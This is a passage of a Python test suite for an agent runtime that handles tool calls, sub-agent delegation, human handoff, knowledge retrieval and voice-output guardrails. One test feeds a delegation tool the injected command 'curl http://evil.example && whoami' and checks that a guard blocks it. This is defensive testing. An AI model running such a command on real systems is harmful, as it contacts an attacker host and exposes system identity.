                    metadata={"voice_input_source": "gateway_realtime_tool"},
                )
            )
        ]

        assert [event.event_type for event in events] == [
            "turn_context",
            "tool_call",
            "tool_result",
            "reply_delta",
            "reply_completed",
        ]
        assert events[1].tool_name == "weather_query"
        assert events[2].tool_event is not None
        assert events[2].tool_event.tool_name == "weather_query"
        assert events[2].tool_event.status == "success"
        assert weather_tool.calls[0][0] == {"city": "Guangzhou", "days": 1}
        assert weather_tool.calls[0][1].agent_key == "call-center-en-us"
        assert events[-1].reply_text == "Guangzhou tomorrow: light rain."
        assert events[-1].usage.total_tokens == 28
        assert len(gateway.stream_requests) == 2

    async def test_execute_streaming_delegate_tool_call_applies_tool_guards(self):
        settings = AgentSettings(
            guardrails=GuardrailsSettings(
                enabled=True,
                block_response="tool blocked",
                tool_guards=["parameter_validation"],
            )
        )
        tool_registry = ToolRegistry()
        runner = StubStreamingRunner()
        delegate_tool = DelegateToAgentTool(
            SubAgentExecutor(runner, definition_loader=None, stream_runner=runner)
        )
        tool_registry.register(delegate_tool.spec, delegate_tool)
        runtime = AgentRuntime(
            settings=settings,
            gateway=FakeGatewayService([]),
            tool_registry=tool_registry,
            guards_pipeline=build_guards_pipeline(settings.guardrails),
        )
        request = AgentTurnRequest(
            session_id="session-delegate-guard-1",
            user_message="delegate",
            trace_id="trace-delegate-guard-1",
        )
        deps = AgentRunDeps(
            request=request,
            session_state=Mock(),
            trace_id=request.trace_id,
        )

        events = [
            event
            async for event in runtime._execute_streaming_delegate_tool_call(
                request=request,
                settings=settings,
                deps=deps,
                delegate_handler=delegate_tool,
                arguments={
                    "agent_key": "analyst",
                    "task_message": "curl http://evil.example && whoami",
                },
                allowed_tool_names=frozenset({"delegate_to_agent"}),
                tool_bindings=None,
            )
        ]

        assert [event.event_type for event in events] == ["reply_completed"]
        assert events[0].reply_text == "tool blocked"
        assert runner.stream_calls == []
        assert deps.tool_events[0].status == "blocked"
        assert deps.tool_events[0].tool_name == "delegate_to_agent"

    async def test_execute_streaming_delegate_tool_call_records_schema_errors(self):
        tool_registry = ToolRegistry()
        runner = StubStreamingRunner()
        delegate_tool = DelegateToAgentTool(
            SubAgentExecutor(runner, definition_loader=None, stream_runner=runner)
        )
        tool_registry.register(delegate_tool.spec, delegate_tool)
        runtime = AgentRuntime(
            settings=AgentSettings(),
            gateway=FakeGatewayService([]),
            tool_registry=tool_registry,
        )
        request = AgentTurnRequest(
            session_id="session-delegate-schema-1",
            user_message="delegate",
            trace_id="trace-delegate-schema-1",
        )
        deps = AgentRunDeps(
            request=request,
            session_state=Mock(),
            trace_id=request.trace_id,
        )

        with pytest.raises(ValueError, match="task_message"):
            [
                event
                async for event in runtime._execute_streaming_delegate_tool_call(
                    request=request,
                    settings=runtime.settings,
                    deps=deps,
                    delegate_handler=delegate_tool,
                    arguments={"agent_key": "analyst"},
                    allowed_tool_names=frozenset({"delegate_to_agent"}),
                    tool_bindings=None,
                )
            ]

        assert runner.stream_calls == []
        assert deps.tool_events[0].status == "error"
        assert deps.tool_events[0].tool_name == "delegate_to_agent"

    async def test_stream_turn_normalizes_delegate_handoff_and_accumulates_usage(self):
        gateway = FakeGatewayService(
            [
                [
                    TextStreamEvent(
                        event_type="completed",
                        provider=ProviderId.OPENAI,
                        model="gpt-4.1-mini",
                        text='{"kind":"tool_call","tool_name":"delegate_to_agent","arguments":{"agent_key":"analyst","task_message":"review this case"}}',
                        usage=UsageInfo(input_tokens=10, output_tokens=5, total_tokens=15),
                    ),
                ],
                [
                    TextStreamEvent(
                        event_type="completed",
                        provider=ProviderId.OPENAI,
                        model="gpt-4.1-mini",
                        text='{"kind":"final","reply_text":"Escalation noted","should_handoff":false}',
                        usage=UsageInfo(input_tokens=4, output_tokens=2, total_tokens=6),
                    ),
                ],
            ]
        )
        tool_registry = ToolRegistry()
        runner = StubStreamingRunner(
            stream_events=[
                AgentTurnStreamEvent(
                    event_type="reply_delta",
                    session_id="session-stream-delegate-1",
                    trace_id="trace-stream-delegate-1",
                    delta="Need specialist review. ",
                ),
                AgentTurnStreamEvent(
                    event_type="handoff",
                    session_id="session-stream-delegate-1",
                    trace_id="trace-stream-delegate-1",
                    reply_text="handoff to human",
                    handoff_reason="requires manual approval",
                    handoff_target=HandoffTarget(
                        target_type="human",
                        reason="requires manual approval",
                    ),
                    usage=UsageInfo(input_tokens=7, output_tokens=3, total_tokens=10),
                ),
            ]
        )
        delegate_tool = DelegateToAgentTool(
            SubAgentExecutor(runner, definition_loader=None, stream_runner=runner)
        )
        tool_registry.register(delegate_tool.spec, delegate_tool)
        runtime = AgentRuntime(
            settings=AgentSettings(),
            gateway=gateway,
            tool_registry=tool_registry,
        )

        events = [
            event
            async for event in runtime.stream_turn(
                AgentTurnRequest(
                    session_id="session-stream-delegate-1",
                    user_message="please delegate",
                    trace_id="trace-stream-delegate-1",
                )
            )
        ]

        assert [event.event_type for event in events] == [
            "tool_call",
            "delegation_delta",
            "tool_result",
            "reply_delta",
            "reply_completed",
        ]
        assert events[1].delta == "Need specialist review. "
        assert events[1].delegation_agent_key == "analyst"
        assert events[2].tool_event is not None
        assert events[2].tool_event.source_type == "delegate"
        assert events[-1].reply_text == "Escalation noted"
        assert events[-1].usage.total_tokens == 31
        assert "[Sub-agent requested human handoff: requires manual approval]" in gateway.stream_requests[1].prompt

    async def test_stream_turn_includes_preloaded_knowledge_chunks_in_prompt(self):
        gateway = FakeGatewayService(
            [
                [
                    TextStreamEvent(
                        event_type="completed",
                        provider=ProviderId.OPENAI,
                        model="gpt-4.1-mini",
                        text='{"kind":"final","reply_text":"Orders ship fast","should_handoff":false}',
                        usage=UsageInfo(input_tokens=6, output_tokens=4, total_tokens=10),
                    ),
                ]
            ]
        )
        runtime = AgentRuntime(
            settings=AgentSettings(),
            gateway=gateway,
            tool_registry=ToolRegistry(knowledge_provider=StubKnowledgeProvider()),
        )

        events = [
            event
            async for event in runtime.stream_turn(
                AgentTurnRequest(
                    session_id="session-stream-prefetch-1",
                    user_message="What is your shipping policy?",
                    trace_id="trace-stream-prefetch-1",
                    knowledge_chunks=[
                        KnowledgeChunk(
                            title="Shipping policy",
                            content="Orders ship within 24 hours after payment confirmation.",
                            source="kb://shipping",
                        )
                    ],
                    knowledge_lookup_status="hit",
                )
            )
        ]

        assert [event.event_type for event in events] == ["reply_delta", "reply_completed"]
        assert events[0].delta == "Orders ship fast"
        assert events[1].reply_text == "Orders ship fast"
        prompt = gateway.stream_requests[0].prompt
        assert "Retrieved knowledge below comes from the current knowledge base." in prompt
        assert "Orders ship within 24 hours after payment confirmation." in prompt

    async def test_stream_turn_maps_handoff_event(self):
        gateway = FakeGatewayService(
            [
                [
                    TextStreamEvent(
                        event_type="completed",
                        provider=ProviderId.OPENAI,
                        model="gpt-4.1-mini",
                        text='{"kind":"final","reply_text":"Escalating","should_handoff":true,"handoff_reason":"refund"}',
                    )
                ]
            ]
        )
        runtime = AgentRuntime(
            settings=AgentSettings(default_handoff_message="handoff"),
            gateway=gateway,
            tool_registry=ToolRegistry(handoff_policy=StubHandoffPolicy()),
        )

        events = [
            event
            async for event in runtime.stream_turn(
                AgentTurnRequest(
                    session_id="session-stream-3",
                    user_message="need manager",
                    trace_id="trace-stream-3",
                )
            )
        ]

        assert [event.event_type for event in events] == ["reply_delta", "handoff"]
        assert events[0].delta == "Escalating"
        assert events[1].reply_text == "handoff"
        assert events[1].handoff_reason == "policy:refund"

    async def test_stream_turn_executes_agent_handoff_via_manager(self):
        gateway = FakeGatewayService(
            [
                [
                    TextStreamEvent(
                        event_type="completed",
                        provider=ProviderId.OPENAI,
                        model="gpt-4.1-mini",
                        text='{"kind":"final","reply_text":"Routing","should_handoff":true,"handoff_reason":"refund","handoff_target_type":"agent","handoff_target_agent":"refund-specialist"}',
                        usage=UsageInfo(input_tokens=5, output_tokens=3, total_tokens=8),
                    )
                ]
            ]
        )
        sub_result = AgentTurnResult(
            session_id="session-stream-agent",
            trace_id="trace-stream-agent",
            action=AgentAction.REPLY,
            reply_text="Refund specialist reply",
            agent_key="refund-specialist",
            responding_agent_key="refund-specialist",
            orchestration_chain=["triage", "refund-specialist"],
            raw_messages=[AgentMessage(role=AgentRole.ASSISTANT, content="Refund specialist reply")],
        )
        runner = StubAgentHandoffRunner(sub_result)
        runtime = AgentRuntime(
            settings=AgentSettings(),
            gateway=gateway,
            tool_registry=ToolRegistry(),
            handoff_manager=HandoffManager(runner),
        )

        events = [
            event
            async for event in runtime.stream_turn(
                AgentTurnRequest(
                    session_id="session-stream-agent",
                    user_message="Need refund help",
                    agent_key="triage",
                    trace_id="trace-stream-agent",
                )
            )
        ]

        assert [event.event_type for event in events] == ["turn_context", "reply_delta", "handoff"]
        assert events[0].agent_key == "triage"
        assert events[1].delta == "Routing"
        assert events[2].reply_text == "Refund specialist reply"
        assert events[2].handoff_target is not None
        assert events[2].handoff_target.target_agent_key == "refund-specialist"

    async def test_stream_turn_uses_definition_aware_settings(self):
        gateway = FakeGatewayService(
            [
                [
                    TextStreamEvent(
                        event_type="completed",
                        provider=ProviderId.OPENAI,
                        model="agent.sales",
                        text='{"kind":"final","reply_text":"Definition stream","should_handoff":false}',
                    )
                ]
            ]
        )
        runtime = AgentRuntime(
            settings=AgentSettings(default_system_prompt="base prompt"),
            gateway=gateway,
            tool_registry=ToolRegistry(),
            definition_loader=StaticAgentDefinitionLoader(
                {"sales-assistant": _sample_definition(tool_mode="manual_only")}
            ),
        )

        events = [
            event
            async for event in runtime.stream_turn(
                AgentTurnRequest(
                    session_id="session-stream-definition-1",
                    user_message="hello",
                    trace_id="trace-stream-definition-1",
                    agent_key="sales-assistant",
                    model="ignored-model",
                    provider=ProviderId.OPENAI,
                )
            )
        ]

        assert [event.event_type for event in events] == ["turn_context", "reply_delta", "reply_completed"]
        assert events[0].agent_key == "sales-assistant"
        assert gateway.stream_requests[0].model == "agent.sales"
        assert gateway.stream_requests[0].provider is None
        assert "You are the sales definition prompt." in gateway.stream_requests[0].prompt
        assert "knowledge_search" not in gateway.stream_requests[0].prompt

    async def test_stream_turn_holds_sentence_until_voice_guardrail_allows_playback(self):
        """Voice channel with voice_guardrails emits reply at sentence boundaries."""
        from agent_runtime.definition.models import VoiceGuardrailsSnapshot

        gateway = FakeGatewayService(
            [
                [
                    TextStreamEvent(
                        event_type="delta",
                        provider=ProviderId.OPENAI,
                        model="agent.sales",
                        delta='{"kind":"final","reply_text":"这是第一句。',
                    ),
                    TextStreamEvent(
                        event_type="delta",
                        provider=ProviderId.OPENAI,
                        model="agent.sales",
                        delta='这是第二句。","should_handoff":false}',
                    ),
                    TextStreamEvent(
                        event_type="completed",
                        provider=ProviderId.OPENAI,
                        model="agent.sales",
                        text='{"kind":"final","reply_text":"这是第一句。这是第二句。","should_handoff":false}',
                        usage=UsageInfo(input_tokens=10, output_tokens=8, total_tokens=18),
                    ),
                ]
            ]
        )

        snapshot = _sample_definition(
            runtime_options={"voice_output_buffering": "sentence"},
            guardrails_policy={"voice_guardrails": {"mode": "observe_only", "revision": 1}},
            voice_guardrails=VoiceGuardrailsSnapshot(mode="observe_only", revision=1),
        )

        runtime = AgentRuntime(
            settings=AgentSettings(),
            gateway=gateway,
            tool_registry=ToolRegistry(),
            definition_loader=StaticAgentDefinitionLoader({"sales-assistant": snapshot}),
        )

        events = [
            event
            async for event in runtime.stream_turn(
                AgentTurnRequest(
                    session_id="s1",
                    user_message="继续",
                    channel="voice",
                    agent_key="sales-assistant",
                )
            )
        ]

        reply_chunks = [e for e in events if e.event_type == "reply_delta" and e.delta]
        # Must be separate events (one per sentence boundary), not merged into one
        assert len(reply_chunks) >= 2, f"Expected ≥2 sentence events, got {len(reply_chunks)}: {[e.delta for e in reply_chunks]}"
        assert any("这是第一句" in e.delta for e in reply_chunks)
        assert any("这是第二句" in e.delta for e in reply_chunks)
        # Verify no single event contains both sentences
        assert not any("这是第一句" in e.delta and "这是第二句" in e.delta for e in reply_chunks)

    async def test_stream_turn_voice_channel_without_guardrails_streams_directly(self):
        gateway = FakeGatewayService(
            [
                [
                    TextStreamEvent(
                        event_type="delta",
                        provider=ProviderId.OPENAI,
                        model="agent.sales",
                        delta='{"kind":"final","reply_text":"没有',
                    ),
                    TextStreamEvent(
                        event_type="delta",
                        provider=ProviderId.OPENAI,
                        model="agent.sales",
                        delta='护栏。","should_handoff":false}',
                    ),
                    TextStreamEvent(
                        event_type="completed",
                        provider=ProviderId.OPENAI,
                        model="agent.sales",
                        text='{"kind":"final","reply_text":"没有护栏。","should_handoff":false}',
                        usage=UsageInfo(input_tokens=8, output_tokens=4, total_tokens=12),
                    ),
                ]
            ]
        )

        runtime = AgentRuntime(
            settings=AgentSettings(),
            gateway=gateway,
            tool_registry=ToolRegistry(),
            definition_loader=StaticAgentDefinitionLoader({"sales-assistant": _sample_definition()}),
        )

        events = [
            event
            async for event in runtime.stream_turn(
                AgentTurnRequest(
                    session_id="s-no-guard",
                    user_message="继续",
                    channel="voice",
                    agent_key="sales-assistant",
                )
            )
        ]

        reply_chunks = [e.delta for e in events if e.event_type == "reply_delta" and e.delta]
        assert reply_chunks == ["没有", "护栏。"]

    async def test_stream_turn_chat_channel_with_guardrails_streams_directly(self):
        from agent_runtime.definition.models import VoiceGuardrailsSnapshot

        gateway = FakeGatewayService(
            [
                [
                    TextStreamEvent(
                        event_type="delta",
                        provider=ProviderId.OPENAI,
                        model="agent.sales",
                        delta='{"kind":"final","reply_text":"聊天',
                    ),
                    TextStreamEvent(
                        event_type="delta",
                        provider=ProviderId.OPENAI,
                        model="agent.sales",
                        delta='通道。","should_handoff":false}',
                    ),
                    TextStreamEvent(
                        event_type="completed",
                        provider=ProviderId.OPENAI,
                        model="agent.sales",
                        text='{"kind":"final","reply_text":"聊天通道。","should_handoff":false}',
                        usage=UsageInfo(input_tokens=8, output_tokens=4, total_tokens=12),
                    ),
                ]
            ]
        )

        snapshot = _sample_definition(
            guardrails_policy={"voice_guardrails": {"mode": "observe_only", "revision": 1}},
            voice_guardrails=VoiceGuardrailsSnapshot(mode="observe_only", revision=1),
        )
        runtime = AgentRuntime(
            settings=AgentSettings(),
            gateway=gateway,
            tool_registry=ToolRegistry(),
            definition_loader=StaticAgentDefinitionLoader({"sales-assistant": snapshot}),
        )

        events = [
            event
            async for event in runtime.stream_turn(
                AgentTurnRequest(
                    session_id="s-chat",
                    user_message="继续",
                    channel="chat",
                    agent_key="sales-assistant",
                )
            )
        ]

        reply_chunks = [e.delta for e in events if e.event_type == "reply_delta" and e.delta]
        assert reply_chunks == ["聊天", "通道。"]

    async def test_stream_turn_voice_partial_buffer_flushed_at_stream_end(self):
        from agent_runtime.definition.models import VoiceGuardrailsSnapshot

        gateway = FakeGatewayService(
            [
                [
                    TextStreamEvent(
                        event_type="delta",
                        provider=ProviderId.OPENAI,
                        model="agent.sales",
                        delta='{"kind":"final","reply_text":"未完成的句子',
                    ),
                    TextStreamEvent(
                        event_type="completed",
                        provider=ProviderId.OPENAI,
                        model="agent.sales",
                        text='{"kind":"final","reply_text":"未完成的句子","should_handoff":false}',
                        usage=UsageInfo(input_tokens=8, output_tokens=4, total_tokens=12),
                    ),
                ]
            ]
        )

        snapshot = _sample_definition(
            guardrails_policy={"voice_guardrails": {"mode": "observe_only", "revision": 1}},
            voice_guardrails=VoiceGuardrailsSnapshot(mode="observe_only", revision=1),
        )
        runtime = AgentRuntime(
            settings=AgentSettings(),
            gateway=gateway,
            tool_registry=ToolRegistry(),
            definition_loader=StaticAgentDefinitionLoader({"sales-assistant": snapshot}),
        )

        events = [
            event
            async for event in runtime.stream_turn(
                AgentTurnRequest(
                    session_id="s-partial",
                    user_message="继续",
                    channel="voice",
                    agent_key="sales-assistant",
                )
            )
        ]

        reply_chunks = [e.delta for e in events if e.event_type == "reply_delta" and e.delta]
        assert reply_chunks == ["未完成的句子"]

    async def test_stream_turn_voice_observe_only_simulates_fallback_without_emitting_it(self):
        from agent_runtime.definition.models import VoiceGuardrailsSnapshot

        generator = _CountingSafeReplyGenerator("让我换个说法。")
        runtime = AgentRuntime(
            settings=AgentSettings(),
            gateway=FakeGatewayService(
                [[
                    TextStreamEvent(
                        event_type="completed",
                        provider=ProviderId.OPENAI,
                        model="agent.sales",
                        text='{"kind":"final","reply_text":"你的银行卡号是 1234。","should_handoff":false}',
                        usage=UsageInfo(input_tokens=4, output_tokens=4, total_tokens=8),
                    )
                ]]
            ),
            tool_registry=ToolRegistry(),
            definition_loader=StaticAgentDefinitionLoader(
                {
                    "sales-assistant": _sample_definition(
                        guardrails_policy={"voice_guardrails": {"mode": "observe_only", "revision": 1}},
                        voice_guardrails=VoiceGuardrailsSnapshot(
                            mode="observe_only",
                            revision=1,
                            actions=("fallback_reply",),
                        ),
                    )
                }
            ),
            guards_pipeline=GuardsPipeline(
                output_guards=[
                    _StaticGuard(
                        name="voice_output_judge",
                        phase="output",
                        result=GuardResult(
                            verdict=GuardVerdict.BLOCK,
                            guard_name="voice_output_judge",
                            reason="voice_segment_blocked",
                            details={"suggested_action": "fallback_reply"},
                        ),
                    )
                ],
                safe_reply_generator=generator,
            ),
        )

        events = [
            event
            async for event in runtime.stream_turn(
                AgentTurnRequest(
                    session_id="voice-observe-1",
                    user_message="继续",
                    channel="voice",
                    agent_key="sales-assistant",
                )
            )
        ]

        reply_chunks = [e.delta for e in events if e.event_type == "reply_delta" and e.delta]
        assert reply_chunks == ["你的银行卡号是 1234。"]
        assert events[-1].event_type == "reply_completed"
        assert events[-1].reply_text == "你的银行卡号是 1234。"
        assert generator.calls == []

    async def test_stream_turn_voice_enforced_fallback_emits_replacement_text(self):
        from agent_runtime.definition.models import VoiceGuardrailsSnapshot

        generator = _CountingSafeReplyGenerator("让我换个安全的说法。")
        runtime = AgentRuntime(
            settings=AgentSettings(),
            gateway=FakeGatewayService(
                [[
                    TextStreamEvent(
                        event_type="completed",
                        provider=ProviderId.OPENAI,
                        model="agent.sales",
                        text='{"kind":"final","reply_text":"你的银行卡号是 1234。","should_handoff":false}',
                        usage=UsageInfo(input_tokens=4, output_tokens=4, total_tokens=8),
                    )
                ]]
            ),
            tool_registry=ToolRegistry(),
            definition_loader=StaticAgentDefinitionLoader(
                {
                    "sales-assistant": _sample_definition(
                        guardrails_policy={"voice_guardrails": {"mode": "enforced", "revision": 2}},
                        voice_guardrails=VoiceGuardrailsSnapshot(
                            mode="enforced",
                            revision=2,
                            actions=("fallback_reply",),
                        ),
                    )
                }
            ),
            guards_pipeline=GuardsPipeline(
                output_guards=[
                    _StaticGuard(
                        name="voice_output_judge",
                        phase="output",
                        result=GuardResult(
                            verdict=GuardVerdict.BLOCK,
                            guard_name="voice_output_judge",
                            reason="voice_segment_blocked",
                            details={"suggested_action": "fallback_reply"},
                        ),
                    )
                ],
                safe_reply_generator=generator,
            ),
        )

        events = [
            event
            async for event in runtime.stream_turn(
                AgentTurnRequest(
                    session_id="voice-fallback-1",
                    user_message="继续",
                    channel="voice",
                    agent_key="sales-assistant",
                )
            )
        ]

        reply_chunks = [e.delta for e in events if e.event_type == "reply_delta" and e.delta]
        assert reply_chunks == ["让我换个安全的说法。"]
        assert events[-1].event_type == "reply_completed"
        assert events[-1].reply_text == "让我换个安全的说法。"
        assert len(generator.calls) == 1

    async def test_stream_turn_voice_global_guardrail_handoff_blocks_buffered_reply(self):
        from agent_runtime.definition.models import VoiceGuardrailsSnapshot

        runtime = AgentRuntime(
            settings=AgentSettings(default_handoff_message="请稍候，我为你转接人工。"),
            gateway=FakeGatewayService(
                [[
                    TextStreamEvent(
                        event_type="delta",
                        provider=ProviderId.OPENAI,
                        model="agent.sales",
                        delta='{"kind":"final","reply_text":"你的银行卡号是 1234。',
                    ),
                    TextStreamEvent(
                        event_type="completed",
                        provider=ProviderId.OPENAI,
                        model="agent.sales",
                        text='{"kind":"final","reply_text":"你的银行卡号是 1234。","should_handoff":false}',
                        usage=UsageInfo(input_tokens=4, output_tokens=4, total_tokens=8),
                    )
                ]]
            ),
            tool_registry=ToolRegistry(),
            definition_loader=StaticAgentDefinitionLoader(
                {
                    "sales-assistant": _sample_definition(
                        guardrails_policy={"voice_guardrails": {"mode": "observe_only", "revision": 7}},
                        voice_guardrails=VoiceGuardrailsSnapshot(
                            mode="observe_only",
                            revision=7,
                        ),
                    )
                }
            ),
            global_guardrails_repository=StaticGlobalGuardrailsRepository(
                GlobalGuardrailsSnapshot(
                    ruleset_key="global",
                    revision=12,
                    rules=(
                        _global_rule(
                            rule_key="voice-sensitive-output",
                            priority=10,
                            action="handoff",
                            reason="manual_review_required",
                            hints=("银行卡号",),
                        ),
                    ),
                )
            ),
        )

        events = [
            event
            async for event in runtime.stream_turn(
                AgentTurnRequest(
                    session_id="voice-global-handoff-1",
                    user_message="继续",
                    channel="voice",
                    agent_key="sales-assistant",
                )
            )
        ]

        assert [event.event_type for event in events] == ["turn_context", "handoff"]
        assert events[1].reply_text == "请稍候，我为你转接人工。"
        assert events[1].handoff_reason == "manual_review_required"
        assert [event.delta for event in events if event.event_type == "reply_delta"] == []

    async def test_stream_turn_voice_transfer_human_yields_structured_handoff_event(self):
        from agent_runtime.definition.models import VoiceGuardrailsSnapshot

        runtime = AgentRuntime(
            settings=AgentSettings(default_handoff_message="请稍候，我为你转接人工。"),
            gateway=FakeGatewayService(
                [[
                    TextStreamEvent(
                        event_type="completed",
                        provider=ProviderId.OPENAI,
                        model="agent.sales",
                        text='{"kind":"final","reply_text":"你的银行卡号是 1234。","should_handoff":true,"handoff_target_type":"agent","handoff_target_agent":"other-agent"}',
                        usage=UsageInfo(input_tokens=4, output_tokens=4, total_tokens=8),
                    )
                ]]
            ),
            tool_registry=ToolRegistry(),
            definition_loader=StaticAgentDefinitionLoader(
                {
                    "sales-assistant": _sample_definition(
                        guardrails_policy={"voice_guardrails": {"mode": "enforced", "revision": 3}},
                        voice_guardrails=VoiceGuardrailsSnapshot(
                            mode="enforced",
                            revision=3,
                            actions=("transfer_human",),
                        ),
                    )
                }
            ),
            guards_pipeline=GuardsPipeline(
                output_guards=[
                    _StaticGuard(
                        name="voice_output_judge",
                        phase="output",
                        result=GuardResult(
                            verdict=GuardVerdict.BLOCK,
                            guard_name="voice_output_judge",
                            reason="voice_segment_blocked",
                            details={"suggested_action": "transfer_human"},
                        ),
                    )
                ]
            ),
        )

        events = [
            event
            async for event in runtime.stream_turn(
                AgentTurnRequest(
                    session_id="voice-transfer-1",
                    user_message="继续",
                    channel="voice",
                    agent_key="sales-assistant",
                )
            )
        ]

        handoff_events = [event for event in events if event.event_type == "handoff"]
        assert len(handoff_events) == 1
        assert handoff_events[0].reply_text == "请稍候，我为你转接人工。"
        assert handoff_events[0].handoff_target is not None
        assert handoff_events[0].handoff_target.target_type == "human"
        assert handoff_events[0].handoff_reason == "voice_segment_blocked"
        assert [event.delta for event in events if event.event_type == "reply_delta"] == []

    async def test_stream_turn_voice_transfer_human_takes_precedence_over_model_agent_handoff(self):
        """
        Regression: voice transfer_human takes precedence over model agent handoff
        """
        from agent_runtime.definition.models import VoiceGuardrailsSnapshot
        sub_result = AgentTurnResult(
            session_id="session-sub-voice-1",
            trace_id="trace-sub-voice-1",
            action=AgentAction.REPLY,
            reply_text="Agent handoff should not execute",
            agent_key="other-agent",
            raw_messages=[AgentMessage(role=AgentRole.ASSISTANT, content="Agent handoff should not execute")],
        )
        runner = StubAgentHandoffRunner(sub_result)

        runtime = AgentRuntime(
            settings=AgentSettings(default_handoff_message="[HANDOFF] Please wait for a human agent."),
            gateway=FakeGatewayService(
                [[
                    TextStreamEvent(
                        event_type="completed",
                        provider=ProviderId.OPENAI,
                        model="agent.sales",
                        text='{"kind":"final","reply_text":"Sensitive info suppressed.","should_handoff":true,"handoff_target_type":"agent","handoff_target_agent":"other-agent"}',
                        usage=UsageInfo(input_tokens=4, output_tokens=4, total_tokens=8),
                    )
                ]]
            ),
            tool_registry=ToolRegistry(),
            definition_loader=StaticAgentDefinitionLoader(
                {
                    "sales-assistant": _sample_definition(
                        guardrails_policy={"voice_guardrails": {"mode": "enforced", "revision": 6}},
                        voice_guardrails=VoiceGuardrailsSnapshot(
                            mode="enforced",
                            revision=6,
                            actions=("transfer_human",),
                        ),
                    )
                }
            ),
            guards_pipeline=GuardsPipeline(
                output_guards=[
                    _StaticGuard(
                        name="voice_output_judge",
                        phase="output",
                        result=GuardResult(
                            verdict=GuardVerdict.BLOCK,
                            guard_name="voice_output_judge",
                            reason="voice_segment_blocked",
                            details={"suggested_action": "transfer_human"},
                        ),
                    )
                ]
            ),
            handoff_manager=HandoffManager(runner),
        )

        events = [
            event
            async for event in runtime.stream_turn(
                AgentTurnRequest(
                    session_id="voice-transfer-precedence-1",
                    user_message="继续",
                    channel="voice",
                    agent_key="sales-assistant",
                )
            )
        ]
        handoff_events = [event for event in events if event.event_type == "handoff"]
        assert len(handoff_events) == 1
        assert handoff_events[0].reply_text == "[HANDOFF] Please wait for a human agent."
        assert handoff_events[0].handoff_target is not None
        assert handoff_events[0].handoff_target.target_type == "human"
        assert handoff_events[0].handoff_reason == "voice_segment_blocked"
        assert [event.delta for event in events if event.event_type == "reply_delta"] == []
        assert runner.calls == []
    async def test_stream_turn_voice_interrupt_only_suppresses_blocked_segment(self):
        from agent_runtime.definition.models import VoiceGuardrailsSnapshot

        runtime = AgentRuntime(
            settings=AgentSettings(),
            gateway=FakeGatewayService(
                [[
                    TextStreamEvent(
                        event_type="completed",
                        provider=ProviderId.OPENAI,
                        model="agent.sales",
                        text='{"kind":"final","reply_text":"你的银行卡号是 1234。","should_handoff":true}',
                        usage=UsageInfo(input_tokens=4, output_tokens=4, total_tokens=8),
                    )
                ]]
            ),
            tool_registry=ToolRegistry(),
            definition_loader=StaticAgentDefinitionLoader(
                {
                    "sales-assistant": _sample_definition(
                        guardrails_policy={"voice_guardrails": {"mode": "enforced", "revision": 4}},
                        voice_guardrails=VoiceGuardrailsSnapshot(
                            mode="enforced",
                            revision=4,
                            actions=("interrupt_only",),
                        ),
                    )
                }
            ),
            guards_pipeline=GuardsPipeline(
                output_guards=[
                    _StaticGuard(
                        name="voice_output_judge",
                        phase="output",
                        result=GuardResult(
                            verdict=GuardVerdict.BLOCK,
                            guard_name="voice_output_judge",
                            reason="voice_segment_blocked",
                            details={"suggested_action": "interrupt_only"},
                        ),
                    )
                ]
            ),
        )

        events = [
            event
            async for event in runtime.stream_turn(
                AgentTurnRequest(
                    session_id="voice-interrupt-1",
                    user_message="继续",
                    channel="voice",
                    agent_key="sales-assistant",
                )
            )
        ]

        # If should_handoff is true and output is suppressed, handoff event should use default handoff message
        handoff_events = [event for event in events if event.event_type == "handoff"]
        if handoff_events:
            assert handoff_events[0].reply_text == runtime.settings.default_handoff_message
        else:
            assert [event.delta for event in events if event.event_type == "reply_delta"] == []
            assert events[-1].event_type == "reply_completed"
            assert events[-1].reply_text == ""

    async def test_stream_turn_voice_interrupt_only_with_model_handoff_preserves_default_handoff_message(self):
        """
        Regression: interrupt_only + model should_handoff=true preserves default handoff message
        """
        from agent_runtime.definition.models import VoiceGuardrailsSnapshot

        runtime = AgentRuntime(
            settings=AgentSettings(default_handoff_message="[HANDOFF] Please wait for a human agent."),
            gateway=FakeGatewayService(
                [[
                    TextStreamEvent(
                        event_type="completed",
                        provider=ProviderId.OPENAI,
                        model="agent.sales",
                        text='{"kind":"final","reply_text":"Sensitive info suppressed.","should_handoff":true,"handoff_reason":"voice escalation"}',
                        usage=UsageInfo(input_tokens=4, output_tokens=4, total_tokens=8),
                    )
                ]]
            ),
            tool_registry=ToolRegistry(),
            definition_loader=StaticAgentDefinitionLoader(
                {
                    "sales-assistant": _sample_definition(
                        guardrails_policy={"voice_guardrails": {"mode": "enforced", "revision": 5}},
                        voice_guardrails=VoiceGuardrailsSnapshot(
                            mode="enforced",
                            revision=5,
                            actions=("interrupt_only",),
                        ),
                    )
                }
            ),
            guards_pipeline=GuardsPipeline(
                output_guards=[
                    _StaticGuard(
                        name="voice_output_judge",
                        phase="output",
                        result=GuardResult(
                            verdict=GuardVerdict.BLOCK,
                            guard_name="voice_output_judge",
                            reason="voice_segment_blocked",
                            details={"suggested_action": "interrupt_only"},
                        ),
                    )
                ]
            ),
        )

        events = [
            event
            async for event in runtime.stream_turn(
                AgentTurnRequest(
                    session_id="voice-interrupt-handoff-1",
                    user_message="继续",
                    channel="voice",
                    agent_key="sales-assistant",
                )
            )
        ]
        handoff_events = [event for event in events if event.event_type == "handoff"]
        assert len(handoff_events) == 1
        assert handoff_events[0].reply_text == "[HANDOFF] Please wait for a human agent."
        assert handoff_events[0].handoff_reason == "voice escalation"

# ---------------------------------------------------------------------------
# Task 4: Lock knowledge_search tool to unified execution path
# ---------------------------------------------------------------------------


class TestKnowledgeSearchToolUnifiedPath:
    """Verify KnowledgeSearchTool prefers search_bound_knowledge_bases() when
    knowledge_bindings are present in the execution context."""

    @pytest.mark.asyncio
    async def test_knowledge_search_tool_prefers_bound_knowledge_search_provider(self):
        class FakeProvider:
            async def search_bound_knowledge_bases(self, **kwargs):
                return [
                    KnowledgeChunk(
                        title="qa",
                        source="qa",
                        content="L1 为部门负责人，L2 为分管副总。",
                        score=0.9,
                        metadata={"knowledge_base_id": "101"},
                    )
                ]

        tool = KnowledgeSearchTool(knowledge_provider=FakeProvider())
        context = ToolExecutionContext(
            session_id="s1",
            trace_id="t1",
            agent_key="测试",
            agent_version=4,
            knowledge_bindings=(
                KnowledgeBindingSnapshot(
                    knowledge_base_id="101", sort_order=0, config={}, config_version=1
                ),
            ),
        )

        result = await tool.execute({"query": "公司 L1、L2 审批分别是谁？"}, context)

        assert result.status == "success"
        assert "L1 为部门负责人" in result.output

    @pytest.mark.asyncio
